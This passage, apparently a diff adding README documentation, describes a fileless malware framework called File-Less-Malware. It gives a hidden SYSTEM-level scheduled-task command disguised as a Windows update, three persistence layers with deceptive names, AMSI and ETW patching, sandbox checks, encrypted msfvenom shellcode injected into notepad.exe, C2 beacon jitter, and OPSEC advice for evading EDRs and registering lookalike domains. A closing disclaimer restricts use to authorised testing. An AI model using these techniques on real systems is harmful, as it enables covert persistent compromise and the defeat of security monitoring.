+schtasks /create /tn "WindowsUpdateTask" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand <BASE64>" /sc onlogon /ru SYSTEM /f
+schtasks /run /tn "WindowsUpdateTask"
+```
+
+---
+
+## Persistence Mechanisms
+
+Once the loader establishes persistence (Stage 4), the implant will survive reboots using three layers:
+
+### Layer 1: WMI Event Subscription (Primary)
+
+| Component | Purpose |
+|---|---|
+| `__EventFilter` | Triggers on system performance counter changes (every 1 hour by default) |
+| `CommandLineEventConsumer` | Executes the PowerShell re-infection command |
+| `__FilterToConsumerBinding` | Connects the filter to the consumer |
+
+**Why this is powerful:** The WMI repository is a system file (`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`). Antivirus cannot simply "delete" a WMI subscription — it would corrupt the entire repository. Most EDRs do not monitor WMI subscription creation by default.
+
+### Layer 2: Registry Run Key (Backup)
+
+| Registry Path | Value Name |
+|---|---|
+| `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` | `WindowsDefenderHealthUpdate_XXXXX` |
+
+### Layer 3: Scheduled Task (Tertiary)
+
+| Task Name | Trigger | Runs As |
+|---|---|---|
+| `MicrosoftEdgeUpdateTask_XXXXX` | Daily | SYSTEM |
+
+All persistence mechanisms re-execute the same encoded PowerShell payload — no new files are ever created.
+
+---
+
+## Evasion Techniques
+
+### AMSI Bypass (Stage 0)
+
+Windows Defender's Antimalware Scan Interface scans PowerShell scripts before execution. File-Less-Malware uses multiple layered bypasses:
+
+| Technique | How It Works |
+|---|---|
+| `amsiInitFailed` | Sets the `amsiInitFailed` field to `$true`, disabling AMSI for the session |
+| `AmsiScanBuffer` memory patch | Overwrites the function with `xor rax,rax; ret` (returns 0 = clean) |
+| Provider removal | Removes AMSI provider GUIDs from the registry |
+
+### ETW Patching (Stage 0)
+
+Event Tracing for Windows sends telemetry to EDR solutions. File-Less-Malware patches `EtwEventWrite` in `ntdll.dll` with `xor rax,rax; ret` — the function still exists but does nothing.
+
+### Sandbox Evasion (Stage 1)
+
+Before deploying the real payload, the loader checks for analysis environments:
+
+| Check | Detection Target |
+|---|---|
+| BIOS serial number | VMware, VirtualBox, Hyper-V default serials |
+| System model | Virtual machine model strings |
+| RAM size | Sandboxes often have < 4 GB |
+| Disk size | Sandboxes often have < 60 GB C: drives |
+| Running processes | procmon, wireshark, Process Hacker, debuggers |
+| Username | Common sandbox usernames |
+| Network gateway | VirtualBox NAT gateway (10.0.2.x) |
+
+If any indicator is found, the loader runs a benign decoy (simulates Windows Update) and exits cleanly.
+
+### Encrypted Shellcode Transport
+
+The shellcode is:
+1. Generated by msfvenom
+2. XOR-encrypted with a 16-byte rolling key
+3. Base64-encoded for transmission
+4. Only decrypted in memory at runtime
+
+This defeats signature-based detection and network inspection.
+
+### Process Injection (Stage 3)
+
+The shellcode executes inside a legitimate Windows process (`notepad.exe` by default):
+
+- `notepad.exe` is signed by Microsoft
+- EDRs trust signed processes more than unsigned ones
+- The injection uses raw Win32 API calls (not .NET wrappers)
+- Memory is allocated RW, written, then changed to RX (never stays RWX)
+
+### C2 Jitter (Stage 5)
+
+The beacon interval includes random jitter:
+
+- Base interval: 120 seconds
+- Jitter: ±35% (random between ~78 and ~162 seconds)
+- Sleep uses entropy collection loops instead of simple `Start-Sleep`
+
+This defeats sandbox timing analysis and beacon detection rules.
+
+---
+
+## Detection & OPSEC Considerations
+
+### What EDRs May See
+
+| Artifact | What It Looks Like | How to Mitigate |
+|---|---|---|
+| PowerShell command line | Long base64 string in Event 4688 | Use shorter, fragmented commands |
+| Process creation (notepad.exe) | PowerShell spawning notepad.exe | Use `svchost.exe` or `explorer.exe` instead |
+| WMI subscription creation | New `__EventFilter` in root\subscription | Use longer random names, lower event frequency |
+| Network connections | DNS queries to your domain | Use a legitimate-looking domain, add DNS padding |
+| Memory allocation | VirtualAllocEx in notepad.exe | Use smaller shellcode, enable sleep obfuscation |
+
+### Recommended OPSEC Improvements
+
+| Area | Improvement |
+|---|---|
+| Domain | Register a domain that looks legitimate (e.g., `cdn-azure-static.net`) |
+| Certificate | Use Let's Encrypt for valid TLS on your C2 server |
+| Beacon timing | Set `BeaconInterval` to 300–600 seconds for low-and-slow |
+| Target process | Use `svchost.exe` or `RuntimeBroker.exe` instead of notepad |
+| Shellcode | Use staged payload (smaller initial shellcode) |
+| Encryption | Change the XOR key per operation |
+| Delivery | Use signed macros or exploit kits, not raw PowerShell |
+
+### Lab Testing
+
+Before deploying in an engagement, test against:
+
+1. **Windows Defender** — Ensure AMSI bypass works
+2. **Microsoft Defender for Endpoint** — Check for behavioral alerts
+3. **Sysmon** — Review Event ID 1 (process creation), 7 (image load), 8 (CreateRemoteThread)
+4. **Velociraptor** — Check for WMI subscription artifacts
+5. **Your target's EDR** — If known, test specifically against it
+
+---
+
+## Troubleshooting
+
+### "OpenProcess failed" / Access Denied
+
+**Cause:** `PROCESS_ALL_ACCESS` requires admin rights.  
+**Fix:** Run the loader as Administrator, or change `TargetProcess` to a process running under the same user account.
+
+### No Beacons Received on C2 Server
+
+| Cause | Check |
+|---|---|
+| DNS resolution | Does `nslookup yourdomain.com` resolve to your C2 IP? |
+| Firewall | Are ports 53 (UDP) and 443 (TCP) open on your VPS? |
+| Domain configuration | Is the A record pointing to the correct IP? |
+| Network connectivity | Can the target reach your C2 server? |
+
+### AMSI Still Blocks Execution
+
+**Cause:** Some EDRs hook AMSI differently.  
+**Fix:** Try patching `AmsiScanString` instead of `AmsiScanBuffer`, or use `[System.Reflection.Assembly]::Load` with obfuscated reflection.
+
+### Shellcode Injection Fails
+
+**Cause:** Target process architecture mismatch or EDR hooking.  
+**Fix:** Ensure shellcode architecture matches the target process. Test with a simple `calc.exe` shellcode first.
+
+### WMI Persistence Doesn't Survive Reboot
+
+**Fix:** Verify the persistence command is correctly encoded. Test manually:
+
+```powershell
+$filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE 'WindowsDefenderFilter_%'"
+$filter | Format-List *
+```
+
+### C2 Server "Address Already in Use"
+
+```bash
+# Stop systemd-resolved (temporary)
+sudo systemctl stop systemd-resolved
+sudo systemctl disable systemd-resolved
+```
+
+---
+
+## Legal & Ethical Use
+
+### This tool is STRICTLY for:
+
+- Authorized penetration tests with signed scope-of-work documents
+- Red team exercises within your own organization
+- Security research in isolated lab environments
+- CTF competitions and training scenarios
+- Educational demonstrations with student consent
+
+### You MUST have:
+
+1. **Explicit written authorization** from the system owner
+2. **A defined scope** listing which systems and networks are in scope
+3. **Rules of engagement** specifying allowed techniques
+4. **A stop condition** — when and how to halt the operation
+
+### You MUST NOT use this for:
+
+- Systems you do not own or have written permission to test
+- Bypassing security controls without authorization
+- Exfiltrating data without explicit permission
+- Installing backdoors for unauthorized access
+- Any illegal activity under the Computer Fraud and Abuse Act (CFAA) or equivalent laws in your jurisdiction
+
+### Liability
+
+The authors and contributors of File-Less-Malware assume no liability for misuse of this framework. Users are responsible for compliance with all applicable laws and regulations in their jurisdiction.
+
+---
+
+## Signed
+
+```
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿
+⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿
+⣿⣿⡇⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⢸⣿⣿
+⣿⣿⡇⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿
+⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿
+⣿⣿⡇⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢸⣿⣿
+⣿⣿⡇⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢸⣿⣿
+⣿⣿⡇⠀⠀⠀⠀⠀⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠉⠀⠀⠀⠀⠀⢸⣿⣿
+⣿⣿⡇⠀⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡄⠀⠀⢸⣿⣿
+⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿
+⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿
+⣿⣿⣧⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣸⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+```
 
 <div align="center">
 
-```
-╔══════════════════════════════════════════╗
-║    File-Less-M@lware Advanced Framework  ║
-║         All stages. Memory only.         ║
-╚══════════════════════════════════════════╝
-```
+**File-Less-Malware** — *Advanced Fileless Malware Framework*  
+*For authorized security testing only*
 
 **Signed: skynetfc**
 
